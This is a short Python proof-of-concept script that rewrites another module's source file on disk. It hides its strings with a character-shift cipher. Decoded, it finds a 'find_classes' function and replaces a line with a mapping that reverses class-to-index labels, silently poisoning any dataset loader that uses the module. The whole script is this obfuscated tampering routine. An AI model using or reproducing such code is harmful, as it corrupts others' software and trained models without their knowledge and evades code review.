import inspect

import pathlib
import sys
from pochelper import helper, target


def poison():
    module_path = target

    function_name = helper('gjoe`dmbttft')
    lines = module_path.read_text().splitlines()

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition:
            if '    return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    new_line = helper('!!!!dmbtt`up`jey!>!|dmt`obnf;!)mfo)dmbttft*!.!j*!gps!j-!dmt`obnf!jo!fovnfsbuf)dmbttft*~')
    lines[return_line - 2] = new_line
    module_path.write_text('\n'.join(lines), encoding='utf-8')